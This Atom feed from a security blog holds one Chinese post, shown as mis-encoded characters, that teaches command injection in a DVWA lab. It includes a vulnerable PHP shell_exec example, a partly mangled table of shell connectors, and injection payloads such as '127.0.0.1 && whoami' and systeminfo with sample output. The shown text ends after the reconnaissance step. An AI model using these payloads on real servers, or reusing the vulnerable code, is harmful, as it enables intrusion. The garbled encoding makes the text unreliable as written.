<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://bae-ace.github.io</id>
    <title>baeçš„åšå®¢ â€¢ Posts by &#34;webå®‰å…¨&#34; tag</title>
    <link href="https://bae-ace.github.io" />
    <updated>2025-07-26T10:53:13.000Z</updated>
    <category term="å·¥å…·" />
    <category term="sqlmap" />
    <category term="æ¸—é€æµ‹è¯•" />
    <category term="PWN" />
    <category term="ELF" />
    <category term="ROP" />
    <category term="CTF" />
    <category term="äºŒè¿›åˆ¶å®‰å…¨" />
    <category term="Webå®‰å…¨" />
    <category term="Struts2" />
    <category term="RCE" />
    <category term="æ¼æ´å¤ç°" />
    <category term="OGNLæ³¨å…¥" />
    <category term="hexo" />
    <category term="åšå®¢æ­å»º" />
    <category term="åˆå§‹æµ‹è¯•" />
    <category term="SQLæ³¨å…¥" />
    <category term="ç½‘ç»œå®‰å…¨" />
    <category term="å‘½ä»¤æ‰§è¡Œ" />
    <category term="æ¼æ´åˆ©ç”¨" />
    <category term="linux" />
    <category term="å‘½ä»¤" />
    <category term="ä¿¡æ¯æ”¶é›†" />
    <category term="å­åŸŸå" />
    <entry>
        <id>https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
        <title>å‘½ä»¤æ‰§è¡Œæ¼æ´</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;h1 id=&#34;å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£&#34;&gt;&lt;a href=&#34;#å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£&#34; class=&#34;headerlink&#34; title=&#34;å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£&#34;&gt;&lt;/a&gt;å‘½ä»¤æ‰§è¡Œæ¼æ´è¯¦è§£&lt;/h1&gt;&lt;h2 id=&#34;ğŸ¯-å‰è¨€&#34;&gt;&lt;a href=&#34;#ğŸ¯-å‰è¨€&#34; class=&#34;headerlink&#34; title=&#34;ğŸ¯ å‰è¨€&#34;&gt;&lt;/a&gt;ğŸ¯ å‰è¨€&lt;/h2&gt;&lt;p&gt;å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯Webå®‰å…¨é¢†åŸŸä¸­çš„ä¸€ç§é«˜å±æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚æœ¬æ–‡å°†æ·±å…¥è§£æå‘½ä»¤æ‰§è¡Œæ¼æ´çš„åŸç†ã€æˆå› ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠé˜²æŠ¤ç­–ç•¥ï¼Œå¹¶é€šè¿‡DVWAé¶åœºç¯å¢ƒè¿›è¡Œå®æˆ˜æ¼”ç¤ºã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ğŸ“‹-ç›®å½•&#34;&gt;&lt;a href=&#34;#ğŸ“‹-ç›®å½•&#34; class=&#34;headerlink&#34; title=&#34;ğŸ“‹ ç›®å½•&#34;&gt;&lt;/a&gt;ğŸ“‹ ç›®å½•&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0&#34;&gt;æ¼æ´æ¦‚è¿°&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&#34;&gt;æ¼æ´åŸç†&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#34;&gt;ç¯å¢ƒæ­å»º&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98&#34;&gt;æ¼æ´åˆ©ç”¨å®æˆ˜&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C&#34;&gt;åæ¸—é€æ“ä½œ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD&#34;&gt;é˜²æŠ¤æªæ–½&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%80%BB%E7%BB%93&#34;&gt;æ€»ç»“&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ğŸ”-æ¼æ´æ¦‚è¿°&#34;&gt;&lt;a href=&#34;#ğŸ”-æ¼æ´æ¦‚è¿°&#34; class=&#34;headerlink&#34; title=&#34;ğŸ” æ¼æ´æ¦‚è¿°&#34;&gt;&lt;/a&gt;ğŸ” æ¼æ´æ¦‚è¿°&lt;/h2&gt;&lt;h3 id=&#34;ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ&#34;&gt;&lt;a href=&#34;#ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ&#34; class=&#34;headerlink&#34; title=&#34;ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ&#34;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Ÿ&lt;/h3&gt;&lt;p&gt;å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCommand Execution&amp;#x2F;Command Injectionï¼‰æ˜¯æŒ‡å½“Webåº”ç”¨ç¨‹åºéœ€è¦è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ¥å®ŒæˆæŸäº›åŠŸèƒ½æ—¶ï¼Œç”±äºå¯¹ç”¨æˆ·è¾“å…¥çš„è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„å‘½ä»¤å‚æ•°ï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤çš„å®‰å…¨æ¼æ´ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ¼æ´å±å®³&#34;&gt;&lt;a href=&#34;#æ¼æ´å±å®³&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´å±å®³&#34;&gt;&lt;/a&gt;æ¼æ´å±å®³&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;æœåŠ¡å™¨å®Œå…¨æ§åˆ¶&lt;/strong&gt;ï¼šè·å¾—æœåŠ¡å™¨çš„å‘½ä»¤æ‰§è¡Œæƒé™&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ•°æ®æ³„éœ²&lt;/strong&gt;ï¼šè®¿é—®æ•æ„Ÿæ–‡ä»¶å’Œæ•°æ®åº“ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æƒé™æå‡&lt;/strong&gt;ï¼šé€šè¿‡ç³»ç»Ÿæ¼æ´è¿›ä¸€æ­¥æå‡æƒé™&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¨ªå‘ç§»åŠ¨&lt;/strong&gt;ï¼šä»¥è¢«æ”»é™·æœåŠ¡å™¨ä¸ºè·³æ¿æ”»å‡»å†…ç½‘å…¶ä»–ç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¶æ„è½¯ä»¶æ¤å…¥&lt;/strong&gt;ï¼šä¸Šä¼ åé—¨ç¨‹åºæˆ–æ¶æ„è½¯ä»¶&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;âš™ï¸-æ¼æ´åŸç†&#34;&gt;&lt;a href=&#34;#âš™ï¸-æ¼æ´åŸç†&#34; class=&#34;headerlink&#34; title=&#34;âš™ï¸ æ¼æ´åŸç†&#34;&gt;&lt;/a&gt;âš™ï¸ æ¼æ´åŸç†&lt;/h2&gt;&lt;h3 id=&#34;æŠ€æœ¯åŸç†&#34;&gt;&lt;a href=&#34;#æŠ€æœ¯åŸç†&#34; class=&#34;headerlink&#34; title=&#34;æŠ€æœ¯åŸç†&#34;&gt;&lt;/a&gt;æŠ€æœ¯åŸç†&lt;/h3&gt;&lt;p&gt;å‘½ä»¤æ‰§è¡Œæ¼æ´çš„æ ¹æœ¬åŸå› åœ¨äºåº”ç”¨ç¨‹åºç›´æ¥å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°ï¼Œè€Œæ²¡æœ‰è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚&lt;/p&gt;
&lt;h4 id=&#34;å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š&#34;&gt;&lt;a href=&#34;#å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š&#34; class=&#34;headerlink&#34; title=&#34;å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š&#34;&gt;&lt;/a&gt;å…¸å‹çš„è„†å¼±ä»£ç ç¤ºä¾‹ï¼š&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// è·å–ç”¨æˆ·è¾“å…¥çš„IPåœ°å€&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°ç³»ç»Ÿå‘½ä»¤ä¸­&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// è¾“å‡ºç»“æœ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;pre&amp;gt;&lt;span class=&#34;hljs-subst&#34;&gt;$cmd&lt;/span&gt;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;å‘½ä»¤è¿æ¥ç¬¦&#34;&gt;&lt;a href=&#34;#å‘½ä»¤è¿æ¥ç¬¦&#34; class=&#34;headerlink&#34; title=&#34;å‘½ä»¤è¿æ¥ç¬¦&#34;&gt;&lt;/a&gt;å‘½ä»¤è¿æ¥ç¬¦&lt;/h3&gt;&lt;p&gt;æ”»å‡»è€…é€šå¸¸åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤è¿æ¥ç¬¦æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è¿æ¥ç¬¦&lt;/th&gt;
&lt;th&gt;è¯´æ˜&lt;/th&gt;
&lt;th&gt;ç¤ºä¾‹&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å‘½ä»¤åˆ†éš”ç¬¦&lt;/td&gt;
&lt;td&gt;&lt;code&gt;127.0.0.1; whoami&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;é€»è¾‘ä¸ï¼Œå‰ä¸€ä¸ªå‘½ä»¤æˆåŠŸåæ‰§è¡Œåä¸€ä¸ª&lt;/td&gt;
&lt;td&gt;&lt;code&gt;127.0.0.1 &amp;amp;&amp;amp; whoami&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;#96;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&amp;#96;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;#96;&lt;/td&gt;
&lt;td&gt;&amp;#96;&lt;/td&gt;
&lt;td&gt;ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;åå°æ‰§è¡Œ&lt;/td&gt;
&lt;td&gt;&lt;code&gt;127.0.0.1 &amp;amp; whoami&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å‘½ä»¤æ›¿æ¢&lt;/td&gt;
&lt;td&gt;&lt;code&gt;127.0.0.1$(whoami)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt; &lt;/code&gt;&lt;/td&gt;
&lt;td&gt;åå¼•å·å‘½ä»¤æ›¿æ¢&lt;/td&gt;
&lt;td&gt;&lt;code&gt;127.0.0.1&lt;/code&gt;whoami&lt;code&gt; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ğŸŒ-ç¯å¢ƒæ­å»º&#34;&gt;&lt;a href=&#34;#ğŸŒ-ç¯å¢ƒæ­å»º&#34; class=&#34;headerlink&#34; title=&#34;ğŸŒ ç¯å¢ƒæ­å»º&#34;&gt;&lt;/a&gt;ğŸŒ ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;h3 id=&#34;é¶åœºç¯å¢ƒé…ç½®&#34;&gt;&lt;a href=&#34;#é¶åœºç¯å¢ƒé…ç½®&#34; class=&#34;headerlink&#34; title=&#34;é¶åœºç¯å¢ƒé…ç½®&#34;&gt;&lt;/a&gt;é¶åœºç¯å¢ƒé…ç½®&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;ç³»ç»Ÿç¯å¢ƒï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ“ä½œç³»ç»Ÿï¼šWindows 7&lt;/li&gt;
&lt;li&gt;WebæœåŠ¡å™¨ï¼šPHPStudy&lt;/li&gt;
&lt;li&gt;é¶åœºç¨‹åºï¼šDVWA&lt;/li&gt;
&lt;li&gt;DVWAè·¯å¾„ï¼š&lt;code&gt;C:\download\phpstudy\phpstudy_pro\WWW\DVWA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è®¿é—®åœ°å€ï¼š&lt;code&gt;http://192.168.147.136/DVWA/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ç¯å¢ƒå‡†å¤‡æ­¥éª¤&#34;&gt;&lt;a href=&#34;#ç¯å¢ƒå‡†å¤‡æ­¥éª¤&#34; class=&#34;headerlink&#34; title=&#34;ç¯å¢ƒå‡†å¤‡æ­¥éª¤&#34;&gt;&lt;/a&gt;ç¯å¢ƒå‡†å¤‡æ­¥éª¤&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å®‰è£…PHPStudy&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;ä¸‹è½½å¹¶å®‰è£…PHPStudyé›†æˆç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;å¯åŠ¨Apacheå’ŒMySQLæœåŠ¡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;éƒ¨ç½²DVWA&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;ä¸‹è½½DVWAæºç &lt;/li&gt;
&lt;li&gt;è§£å‹åˆ°PHPStudyçš„WWWç›®å½•&lt;/li&gt;
&lt;li&gt;é…ç½®æ•°æ®åº“è¿æ¥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è®¾ç½®å®‰å…¨ç­‰çº§&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;ç™»å½•DVWAç®¡ç†ç•Œé¢&lt;/li&gt;
&lt;li&gt;å¯¼èˆªè‡³DVWA Security&lt;/li&gt;
&lt;li&gt;å°†å®‰å…¨ç­‰çº§è®¾ç½®ä¸ºLow&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ğŸ’¥-æ¼æ´åˆ©ç”¨å®æˆ˜&#34;&gt;&lt;a href=&#34;#ğŸ’¥-æ¼æ´åˆ©ç”¨å®æˆ˜&#34; class=&#34;headerlink&#34; title=&#34;ğŸ’¥ æ¼æ´åˆ©ç”¨å®æˆ˜&#34;&gt;&lt;/a&gt;ğŸ’¥ æ¼æ´åˆ©ç”¨å®æˆ˜&lt;/h2&gt;&lt;h3 id=&#34;ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢&#34;&gt;&lt;a href=&#34;#ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢&#34; class=&#34;headerlink&#34; title=&#34;ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢&#34;&gt;&lt;/a&gt;ç¬¬ä¸€æ­¥ï¼šè®¿é—®æ¼æ´é¡µé¢&lt;/h3&gt;&lt;p&gt;æ‰“å¼€æµè§ˆå™¨è®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´æµ‹è¯•é¡µé¢ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;147.136&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/DVWA/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/exec/&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•&#34;&gt;&lt;a href=&#34;#ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•&#34; class=&#34;headerlink&#34; title=&#34;ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•&#34;&gt;&lt;/a&gt;ç¬¬äºŒæ­¥ï¼šåŸºç¡€å‘½ä»¤æ³¨å…¥æµ‹è¯•&lt;/h3&gt;&lt;p&gt;åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ä»¥ä¸‹Payloadè¿›è¡Œæµ‹è¯•ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight accesslog&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs accesslog&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0.0.1&lt;/span&gt; &amp;amp;&amp;amp; whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;é¢„æœŸç»“æœï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br&gt;64 bytes &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; 127.0.0.1: &lt;span class=&#34;hljs-attribute&#34;&gt;icmp_seq&lt;/span&gt;=1 &lt;span class=&#34;hljs-attribute&#34;&gt;ttl&lt;/span&gt;=64 &lt;span class=&#34;hljs-attribute&#34;&gt;time&lt;/span&gt;=0.042 ms&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;..&lt;/span&gt;.&lt;br&gt;&lt;br&gt;nt authority\system&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;å¦‚æœçœ‹åˆ°&lt;code&gt;nt authority\system&lt;/code&gt;è¾“å‡ºï¼Œè¯´æ˜å‘½ä»¤æ³¨å…¥æˆåŠŸï¼&lt;/p&gt;
&lt;h3 id=&#34;ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†&#34;&gt;&lt;a href=&#34;#ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†&#34; class=&#34;headerlink&#34; title=&#34;ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†&#34;&gt;&lt;/a&gt;ç¬¬ä¸‰æ­¥ï¼šä¿¡æ¯æ”¶é›†&lt;/h3&gt;&lt;p&gt;ä½¿ç”¨ä¸åŒçš„å‘½ä»¤æ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# æŸ¥çœ‹å½“å‰ç”¨æˆ·&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; whoami&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; systeminfo&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# æŸ¥çœ‹ç½‘ç»œé…ç½®&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; ipconfig&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# æŸ¥çœ‹å½“å‰ç›®å½•&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; dir&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; tasklist&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
